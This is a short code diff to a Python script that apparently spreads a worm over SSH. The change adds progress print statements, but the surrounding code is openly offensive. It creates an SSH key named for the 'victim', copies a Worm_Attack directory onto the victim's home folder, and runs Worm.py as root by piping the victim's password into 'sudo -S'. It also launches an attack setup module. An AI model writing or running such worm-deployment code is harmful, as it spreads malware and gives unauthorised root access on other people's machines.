@@ -7,6 +7,8 @@ WITH_PRIVATE_KEY = '-i ~/.ssh/victim_key'
 
 
 def set_up_ssh_key():
+    print('[Set up ssh key]')
+
     # Create ssh key
     command = 'ssh-keygen -f ~/.ssh/victim_key -q -N \"\"'
     os.system(command)
@@ -19,6 +21,8 @@ def set_up_ssh_key():
 
 
 def send_worm_to_victim():
+    print('[Send worm to the victim]')
+
     # Pass worm to the victim
     command = 'mkdir /home/{0}/Worm_Attack'.format(victim['name'])
     send_ssh_command(command, isNeedPw=False)
@@ -87,12 +91,14 @@ if __name__ == '__main__':
 
         send_worm_to_victim()
 
-        # Run the Worm
+        print('[Start the Worm]')
+        # Start the Worm
         command = 'cd /home/{0}/Worm_Attack && (echo {1} | sudo -S python Worm.py )'.format(victim['name'], victim['password'])
         send_ssh_command(command, isNeedPw=False)
 
     else:
         send_worm_to_victim()
 
+        print('[Reset the Worm]')
         # Set up attack module
         command = 'cd /home/{0}/Worm_Attack && ( python SetUp_Attack.py )'
